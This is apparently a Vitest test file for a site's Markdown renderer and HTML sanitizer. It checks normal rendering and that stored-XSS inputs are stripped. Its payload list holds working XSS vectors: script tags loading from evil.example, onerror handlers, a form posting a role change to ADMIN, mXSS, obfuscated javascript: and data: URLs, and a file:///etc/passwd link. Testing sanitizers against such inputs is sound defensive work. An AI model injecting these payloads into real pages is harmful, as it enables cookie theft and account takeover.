import { describe, it, expect } from "vitest";
import { renderMarkdown, sanitizeContentHtml, EXTERNAL_LINK_REL } from "../src/content/markdown";

/**
 * The renderer's output, read back the way sanitize-html writes it:
 * `<tag name="value" …>`, with &, <, > and " escaped in values.
 */
const ALLOWED: Record<string, string[]> = {
  h1: [], h2: [], h3: [], h4: [], h5: [], h6: [], p: [], br: [], hr: [],
  strong: [], em: [], del: [], code: [], pre: [], blockquote: [],
  ul: [], ol: ["start"], li: [], a: ["href", "title", "rel"], img: ["src", "alt", "title"],
  table: [], thead: [], tbody: [], tr: [], th: ["align"], td: ["align"],
};

const decode = (v: string) =>
  v.replace(/&quot;/g, '"').replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");

/** A URL the page may carry: http(s), mailto (links only) or a path on this site. */
function urlAllowed(tag: string, raw: string): boolean {
  // Browsers skip spaces and control characters in a URL, so the check does too.
  const url = [...raw].filter((c) => c.charCodeAt(0) > 0x20).join("");
  if (/^(https?:)/i.test(url)) return true;
  if (tag === "a" && /^mailto:/i.test(url)) return true;
  // Relative: no scheme, and not "//host" or "/\host", which leave the site.
  return !/^[a-z][a-z0-9+.-]*:/i.test(url) && !/^[/\\]{2}/.test(url);
}

/** Fails the test if the HTML holds anything outside the allowlist. */
function expectSafe(html: string) {
  // Text is escaped, so every raw "<" here starts a tag.
  for (const m of html.matchAll(/<\/([a-zA-Z0-9]+)>/g)) expect(Object.keys(ALLOWED), `</${m[1]}> in ${html}`).toContain(m[1].toLowerCase());
  for (const m of html.matchAll(/<([a-zA-Z0-9]+)([^>]*)>/g)) {
    const tag = m[1].toLowerCase();
    expect(Object.keys(ALLOWED), `tag <${tag}> in ${html}`).toContain(tag);
    const rest = m[2].replace(/\s*\/$/, "");
    const attrs = [...rest.matchAll(/\s([^\s="]+)="([^"]*)"/g)];
    // Every attribute is name="value": nothing else may hide in the tag.
    expect(rest.replace(/\s([^\s="]+)="([^"]*)"/g, "").trim(), `stray markup in <${tag}${rest}>`).toBe("");
    for (const [, name, raw] of attrs) {
      expect(ALLOWED[tag], `attribute ${name} on <${tag}> in ${html}`).toContain(name);
      const value = decode(raw);
      if (name === "href" || name === "src") expect(urlAllowed(tag, value), `${name}="${value}"`).toBe(true);
      if (name === "rel") expect(value).toBe(EXTERNAL_LINK_REL);
    }
  }
}

describe("renderMarkdown — what instructors and staff write", () => {
  it("renders the Markdown the curriculum uses", () => {
    const md = [
      "## The shortest feedback loop",
      "",
      "Keep **small promises**, _daily_, ~~someday~~ and `now`.",
      "",
      "> A missed workout is resolved tomorrow morning.",
      "",
      "1. Fixed days",
      "2. A minimum dose",
      "",
      "- Liquid assets",
      "- Everything else",
      "",
      "4. Starts at four",
      "",
      "| Item | Cost |",
      "|:--|--:|",
      "| Rent | 12,000 |",
      "",
      "---",
      "",
      "```",
      "if (a < b && c > d) {}",
      "```",
    ].join("\n");
    expect(renderMarkdown(md)).toBe(
      [
        "<h2>The shortest feedback loop</h2>",
        "<p>Keep <strong>small promises</strong>, <em>daily</em>, <del>someday</del> and <code>now</code>.</p>",
        "<blockquote>",
        "<p>A missed workout is resolved tomorrow morning.</p>",
        "</blockquote>",
        "<ol>",
        "<li>Fixed days</li>",
        "<li>A minimum dose</li>",
        "</ol>",
        "<ul>",
        "<li>Liquid assets</li>",
        "<li>Everything else</li>",
        "</ul>",
        '<ol start="4">',
        "<li>Starts at four</li>",
        "</ol>",
        "<table>",
        "<thead>",
        "<tr>",
        '<th align="left">Item</th>',
        '<th align="right">Cost</th>',
        "</tr>",
        "</thead>",
        "<tbody><tr>",
        '<td align="left">Rent</td>',
        '<td align="right">12,000</td>',
        "</tr>",
        "</tbody></table>",
        "<hr />",
        "<pre><code>if (a &lt; b &amp;&amp; c &gt; d) {}",
        "</code></pre>",
        "",
      ].join("\n"),
    );
  });

  it("keeps links to http(s), mailto and paths on this site", () => {
    expect(renderMarkdown("[Docs](https://example.com/docs \"The docs\")")).toBe(
      `<p><a href="https://example.com/docs" title="The docs" rel="${EXTERNAL_LINK_REL}">Docs</a></p>\n`,
    );
    expect(renderMarkdown("[Plain](http://example.com)")).toBe(`<p><a href="http://example.com" rel="${EXTERNAL_LINK_REL}">Plain</a></p>\n`);
    expect(renderMarkdown("[Next](/courses/warrior)")).toBe('<p><a href="/courses/warrior">Next</a></p>\n');
    expect(renderMarkdown("[Up](../lesson/2?tab=notes#top)")).toBe('<p><a href="../lesson/2?tab=notes#top">Up</a></p>\n');
    expect(renderMarkdown("[Top](#top)")).toBe('<p><a href="#top">Top</a></p>\n');
    expect(renderMarkdown("[Mail](mailto:hello@example.com)")).toBe('<p><a href="mailto:hello@example.com">Mail</a></p>\n');
  });

  it("marks every external link noopener noreferrer nofollow, replacing what the author wrote", () => {
    expect(renderMarkdown("See https://example.org/path and www.example.com")).toBe(
      `<p>See <a href="https://example.org/path" rel="${EXTERNAL_LINK_REL}">https://example.org/path</a> and ` +
        `<a href="http://www.example.com" rel="${EXTERNAL_LINK_REL}">www.example.com</a></p>\n`,
    );
    expect(renderMarkdown('<a href="HTTPS://example.com" rel="opener" target="_blank">x</a>')).toBe(
      `<p><a href="HTTPS://example.com" rel="${EXTERNAL_LINK_REL}">x</a></p>\n`,
    );
    // A link on this site gets no rel, and an author's rel is dropped.
    expect(renderMarkdown('<a href="/today" rel="nofollow">x</a>')).toBe('<p><a href="/today">x</a></p>\n');
  });

  it("keeps images from http(s) and paths on this site", () => {
    expect(renderMarkdown('![A chart](https://example.com/chart.png "Chart")')).toBe(
      '<p><img src="https://example.com/chart.png" alt="A chart" title="Chart" /></p>\n',
    );
    expect(renderMarkdown("![Logo](/brand/logo.png)")).toBe('<p><img src="/brand/logo.png" alt="Logo" /></p>\n');
  });

  it("is safe and stable on empty input", () => {
    expect(renderMarkdown("")).toBe("");
    expect(renderMarkdown("   \n")).toBe("");
  });
});

describe("renderMarkdown — stored XSS payloads", () => {
  // Before the fix, marked passed each of these to the page as live markup.
  const payloads: Array<[string, string]> = [
    ["img onerror", '<img src=x onerror="fetch(\'/admin/members/1\')">'],
    ["img onerror, unquoted", "<img src=x onerror=alert(document.domain)>"],
    ["img onerror, mixed case", '<IMG SRC=x OnErRoR="alert(1)">'],
    ["script block", "<script>alert(document.cookie)</script>"],
    ["script, mixed case", "<ScRiPt>alert(1)</sCrIpT>"],
    ["script inside a paragraph", "Hello <script>alert(1)</script> world"],
    ["script src", '<script src="https://evil.example/x.js"></script>'],
    ["inline handler on b", '<b onmouseover="alert(1)">hover</b>'],
    ["handler on an allowed tag", '<p onclick="alert(1)">click</p>'],
    ["handler on a link", '<a href="/today" onclick="alert(1)">go</a>'],
    ["svg onload", "<svg onload=alert(1)>"],
    ["svg with script", "<svg><script>alert(1)</script></svg>"],
    ["svg animate href", '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text y="20">x</text></a></svg>'],
    ["svg use", '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=1 onerror=alert(1) /></svg>#x"/></svg>'],
    ["math with xlink", '<math><mi xlink:href="javascript:alert(1)">click</mi></math>'],
    ["math mXSS", "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>"],
    ["iframe javascript", '<iframe src="javascript:alert(1)"></iframe>'],
    ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
    ["iframe fallback", "<iframe><img src=x onerror=alert(1)></iframe>"],
    ["object data", '<object data="javascript:alert(1)"></object>'],
    ["embed", '<embed src="data:text/html,<script>alert(1)</script>">'],
    ["style element", "<style>@import 'https://evil.example/x.css';</style>"],
    ["style attribute", '<p style="background:url(javascript:alert(1))">x</p>'],
    ["style overlay", '<a href="https://evil.example" style="position:fixed;inset:0">x</a>'],
    ["class overlay", '<a href="https://evil.example" class="fixed inset-0 z-50">x</a>'],
    ["form posting a role change", '<form action="/admin/members/1" method="post"><input name="role" value="ADMIN"><button>Save</button></form>'],
    ["input form attribute", '<input form="role-form" name="role" value="ADMIN">'],
    ["button formaction", '<button formaction="javascript:alert(1)">x</button>'],
    ["meta refresh", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
    ["base href", '<base href="https://evil.example/">'],
    ["link stylesheet", '<link rel="stylesheet" href="https://evil.example/x.css">'],
    ["details ontoggle", "<details open ontoggle=alert(1)>x</details>"],
    ["noscript break-out", '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
    ["textarea break-out", "<textarea><img src=x onerror=alert(1)></textarea>"],
    ["xmp break-out", "<xmp><img src=x onerror=alert(1)></xmp>"],
    ["title break-out", "<title><img src=x onerror=alert(1)></title>"],
    ["template", "<template><img src=x onerror=alert(1)></template>"],
    ["comment break-out", "<!--><img src=x onerror=alert(1)>-->"],
    ["CDATA", "<![CDATA[><img src=x onerror=alert(1)>]]>"],
    ["DOM clobbering", '<a id="__NEXT_DATA__" name="location" href="/x">x</a><img name="cookie" src="/a.png">'],
    ["srcset", '<img src="/a.png" srcset="javascript:alert(1) 1x">'],
    ["attribute break-out", '<a href="/x" title="&quot;><img src=x onerror=alert(1)>">x</a>'],
    ["unclosed attribute", '<img src="/a.png" alt="x onerror=alert(1)//'],
    ["data image", '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">'],
  ];

  for (const [name, payload] of payloads) {
    it(name, () => {
      const html = renderMarkdown(payload);
      expectSafe(html);
      expect(html).not.toMatch(/<(script|style|iframe|svg|math|object|embed|form|input|button|meta|base|link|textarea|xmp|noscript|template|details|title)\b/i);
    });
  }

  it("keeps the text around what it removes", () => {
    expect(renderMarkdown("Hello <script>alert(1)</script> world")).toBe("<p>Hello  world</p>\n");
    expect(renderMarkdown('<b onmouseover="alert(1)">hover</b> me')).toBe("<p>hover me</p>\n");
    expect(renderMarkdown('<img src=x onerror="alert(1)">')).toBe('<img src="x" />');
  });
});

describe("renderMarkdown — link and image URLs", () => {
  const blockedHrefs = [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "JaVaScRiPt:alert(document.domain)",
    "&#106;avascript:alert(1)",
    "&#x6A;avascript:alert(1)",
    "&#0000106avascript:alert(1)",
    "javascript&colon;alert(1)",
    "java&#x09;script:alert(1)",
    "java&#10;script:alert(1)",
    "&#x20;javascript:alert(1)",
    "\u0001javascript:alert(1)",
    "vbscript:msgbox(1)",
    "VbScRiPt:msgbox(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "DATA:text/html,x",
    "//evil.example",
    "//evil.example/today",
    "file:///etc/passwd",
    "tel:+15550100",
  ];

  for (const href of blockedHrefs) {
    it(`drops href ${JSON.stringify(href)}`, () => {
      const raw = renderMarkdown(`<a href="${href}">link</a>`);
      expectSafe(raw);
      expect(raw).toBe("<p><a>link</a></p>\n");
      const md = renderMarkdown(`[link](${href.replace(/ /g, "%20")})`);
      expectSafe(md);
      expect(md).not.toMatch(/href=/);
    });

    it(`drops img src ${JSON.stringify(href)}`, () => {
      const raw = renderMarkdown(`<img src="${href}" alt="pic">`);
      expectSafe(raw);
      expect(raw).not.toMatch(/src=/);
    });
  }

  it("drops a backslash path that a browser reads as another host", () => {
    for (const href of ["/\\evil.example", "\\\\evil.example", "\\/evil.example"]) {
      expect(renderMarkdown(`<a href="${href}">link</a>`), href).toBe("<p><a>link</a></p>\n");
    }
    // marked percent-encodes a backslash in a Markdown link, which leaves a path on this site.
    expect(renderMarkdown("[link](/\\evil.example)")).toBe('<p><a href="/%5Cevil.example">link</a></p>\n');
  });

  it("drops the Markdown forms the reviewers traced", () => {
    expect(renderMarkdown("[x](javascript:alert(1))")).toBe("<p><a>x</a></p>\n");
    expect(renderMarkdown("![x](javascript:alert(1))")).toBe('<p><img alt="x" /></p>\n');
    expect(renderMarkdown("[x](//evil.example)")).toBe("<p><a>x</a></p>\n");
    expect(renderMarkdown("[x](data:text/html,hi)")).toBe("<p><a>x</a></p>\n");
    expect(renderMarkdown("![x](data:image/png;base64,iVBORw0KGgo=)")).toBe('<p><img alt="x" /></p>\n');
  });

  it("does not let mailto into an image", () => {
    expect(renderMarkdown("![x](mailto:a@example.com)")).toBe('<p><img alt="x" /></p>\n');
  });
});

describe("sanitizeContentHtml — the allowlist on its own", () => {
  it("passes the allowed tags and attributes through", () => {
    const html = `<h3>T</h3><p>a<br />b</p><a href="/x" title="t">x</a><img src="/a.png" alt="a" title="t" /><ol start="2"><li>x</li></ol>`;
    expect(sanitizeContentHtml(html)).toBe(html);
  });

  it("drops classes, ids, styles and data attributes, even on allowed tags", () => {
    expect(sanitizeContentHtml('<p class="fixed" id="x" style="color:red" data-x="1" hidden>t</p>')).toBe("<p>t</p>");
    expect(sanitizeContentHtml('<pre><code class="language-ts">x</code></pre>')).toBe("<pre><code>x</code></pre>");
  });

  it("keeps table alignment and nothing else on cells", () => {
    expect(sanitizeContentHtml('<table><tr><th align="left" style="color:red">a</th><td align="right" onclick="alert(1)">b</td></tr></table>')).toBe(
      '<table><tr><th align="left">a</th><td align="right">b</td></tr></table>',
    );
  });

  it("escapes text, so it can never become markup", () => {
    expect(sanitizeContentHtml("<p>1 &lt; 2 &amp;&amp; &lt;script&gt;</p>")).toBe("<p>1 &lt; 2 &amp;&amp; &lt;script&gt;</p>");
  });
});
